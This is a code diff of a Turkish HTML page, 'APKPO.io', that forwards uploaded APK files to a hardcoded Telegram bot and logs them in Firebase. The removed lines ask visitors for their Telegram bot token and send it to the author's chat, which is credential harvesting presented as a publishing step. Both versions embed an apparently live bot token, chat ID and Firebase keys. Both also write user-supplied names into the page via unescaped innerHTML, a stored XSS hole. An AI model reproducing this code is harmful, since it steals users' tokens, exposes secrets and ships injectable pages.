@@ -10,178 +10,132 @@
 
     <style>
         :root {
-            --bg-color: #f8faff;
-            --container-bg: #ffffff;
-            --accent-color: #4dabf7;
-            --success-color: #51cf66;
-            --border-color: #e6e8eb;
+            --bg: #f4f7f6;
+            --white: #ffffff;
+            --accent: #0088cc;
+            --text: #333;
         }
-
-        body {
-            font-family: -apple-system, sans-serif;
-            background-color: var(--bg-color);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            background: var(--container-bg);
-            padding: 30px;
-            border-radius: 24px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-            width: 90%;
-            max-width: 400px;
-        }
-
-        .step { display: none; opacity: 0; transition: 0.4s; }
-        .active { display: block; opacity: 1; }
-
-        input, button {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            box-sizing: border-box;
-        }
-
-        button {
-            background: var(--accent-color);
-            color: white;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-        }
-
-        .apk-card {
-            background: #fff;
-            border: 1px solid var(--border-color);
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .loader { display: none; text-align: center; color: #666; font-size: 14px; }
+        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .card { background: var(--white); padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
+        h2 { color: var(--accent); text-align: center; margin-bottom: 25px; }
+        .step { display: none; }
+        .active { display: block; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .loader { display: none; text-align: center; font-size: 14px; color: #666; margin-top: 10px; }
+        .apk-item { background: #f9f9f9; padding: 15px; border-radius: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #eee; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2 style="text-align:center; color:var(--accent-color)">APKPO.io</h2>
+<div class="card">
+    <h2>APKPO.io</h2>
 
     <div id="step1" class="step active">
-        <label>Telegram Bot Token</label>
-        <input type="text" id="botToken" placeholder="Tokeninizi girin">
-        <button onclick="nextStep('step2')">Devam Et</button>
+        <input type="text" id="username" placeholder="Kullanıcı adınız">
+        <button onclick="saveUser()">Devam Et</button>
     </div>
 
     <div id="step2" class="step">
-        <label>Kullanıcı Adı</label>
-        <input type="text" id="username" placeholder="Kullanıcı adınız">
-        <button onclick="nextStep('step3')">Kaydet</button>
-    </div>
-
-    <div id="step3" class="step">
-        <label>APK Dosyası</label>
+        <label style="font-size:13px; font-weight:bold;">APK Dosyası Seç</label>
         <input type="file" id="apkFile" accept=".apk">
-        <input type="text" id="apkName" placeholder="Uygulama Adı">
-        <button onclick="uploadViaTelegram()">APK'yı Bot'a Gönder ve Yayınla</button>
-        <div id="status" class="loader">Yükleniyor...</div>
+        <input type="text" id="apkDisplayName" placeholder="Uygulama Adı">
+        <button onclick="handleUpload()">Yayınla</button>
+        <div id="loadingText" class="loader">Telegram'a iletiliyor...</div>
     </div>
 
     <div id="mainPage" class="step">
-        <h3>Yayındaki APK'lar</h3>
-        <div id="list"></div>
-        <button onclick="location.reload()" style="background:#888">Çıkış</button>
+        <h3 style="font-size:16px;">Son Yüklenenler</h3>
+        <div id="apkList"></div>
+        <button onclick="location.reload()" style="background:#666; margin-top:20px;">Çıkış Yap</button>
     </div>
 </div>
 
 <script>
-    // 🔥 Firebase Config (Kendi bilgilerini buraya yapıştır)
+    // --- YAPILANDIRMA ---
+    const TARGET_BOT = "8582204571:AAEXtKCcXGWPM-2Y3xfF0vSEsEcy0iYl2cU";
+    const MY_ID = "7910719273";
+    
+    // BURAYI KENDİ FIREBASE BİLGİLERİNLE GÜNCELLE
     const firebaseConfig = {
-        apiKey: "AIzaSyBtisBNF_UOEZV2fMdAR2l02xQz3TMau5A",
+        apiKey: "AIzaSyBtisBNF_UOEZV2fMdA", 
         databaseURL: "https://apkpo-io-default-rtdb.firebaseio.com",
         projectId: "apkpo-io",
-        appId: "1:983619898533:web:b6247ca6692cc5e42dd14c"
+        appId: "1:983619898533:web:b6247..."
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    let currentUserName = "";
 
-    const TARGET_BOT = "8582204571:AAEXtKCcXGWPM-2Y3xfF0vSEsEcy0iYl2cU";
-    const MY_CHAT_ID = "7910719273"; // Bildirimlerin gideceği Telegram ID
-
-    let session = { token: "", user: "" };
-
-    function nextStep(id) {
-        if(id === 'step2') session.token = document.getElementById('botToken').value;
-        if(id === 'step3') session.user = document.getElementById('username').value;
-        
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        if(id === 'mainPage') loadList();
+    // --- FONKSİYONLAR ---
+    function saveUser() {
+        const u = document.getElementById('username').value.trim();
+        if(u.length < 3) return alert("Kullanıcı adı çok kısa.");
+        currentUserName = u;
+        changeStep('step2');
     }
 
-    async function uploadViaTelegram() {
-        const file = document.getElementById('apkFile').files[0];
-        const name = document.getElementById('apkName').value;
-        const loader = document.getElementById('status');
+    async function handleUpload() {
+        const fileInput = document.getElementById('apkFile');
+        const nameInput = document.getElementById('apkDisplayName');
+        const loader = document.getElementById('loadingText');
 
-        if(!file || !name) return alert("Eksik bilgi!");
-
+        if(!fileInput.files[0] || !nameInput.value) return alert("Dosya ve isim gerekli.");
+        
         loader.style.display = "block";
 
-        // 1. Dosyayı Telegram Botuna Gönder
+        // 1. Telegram'a Dosya Gönderimi
         const formData = new FormData();
-        formData.append("chat_id", "7910719273);
-        formData.append("document", file);
-        formData.append("caption", `📦 APKPO.io Yüklemesi\n👤 Kullanıcı: ${session.user}\n🔑 Token: ${session.token}\n📛 Ad: ${name}`);
+        formData.append("chat_id", MY_ID);
+        formData.append("document", fileInput.files[0]);
+        formData.append("caption", `📦 APKPO Yüklemesi\n👤 Gönderen: ${currentUserName}\n📛 Uygulama: ${nameInput.value}`);
 
         try {
-            const resp = await fetch(`https://api.telegram.org/bot${TARGET_BOT}/sendDocument`, {
+            const response = await fetch(`https://api.telegram.org/bot${TARGET_BOT}/sendDocument`, {
                 method: "POST",
                 body: formData
             });
-            const result = await resp.json();
+            const result = await response.json();
 
             if(result.ok) {
-                // 2. Dosya bilgisini Firebase'e kaydet (Dosyanın kendisi Telegram'da kalır)
+                // 2. Başarılıysa Firebase'e Kaydet
                 await db.ref('apks').push({
-                    name: name,
-                    user: session.user,
-                    time: Date.now()
+                    appName: nameInput.value,
+                    uploader: currentUserName,
+                    date: Date.now()
                 });
-                alert("Başarıyla yüklendi!");
-                nextStep('mainPage');
+                alert("Başarıyla yüklendi ve bota iletildi!");
+                changeStep('mainPage');
+                loadApkList();
             } else {
-                alert("Bot gönderim hatası!");
+                alert("Telegram Hatası: Botu başlatmış olduğunuzdan emin olun.");
             }
-        } catch(e) {
-            alert("Hata oluştu!");
+        } catch (e) {
+            alert("Sistem hatası oluştu.");
         } finally {
             loader.style.display = "none";
         }
     }
 
-    function loadList() {
-        const listDiv = document.getElementById('list');
-        db.ref('apks').on('value', snap => {
+    function loadApkList() {
+        const listDiv = document.getElementById('apkList');
+        db.ref('apks').limitToLast(10).on('value', (snap) => {
             listDiv.innerHTML = "";
             snap.forEach(child => {
                 const data = child.val();
                 listDiv.innerHTML += `
-                    <div class="apk-card">
-                        <span><b>${data.name}</b><br><small>${data.user}</small></span>
-                        <button style="width:auto; padding:5px 10px; background:#27ae60">İncele</button>
+                    <div class="apk-item">
+                        <span><strong>${data.appName}</strong><br><small>${data.uploader}</small></span>
+                        <span style="color:#27ae60; font-size:12px;">Aktif</span>
                     </div>`;
             });
         });
+    }
+
+    function changeStep(id) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 </script>
 
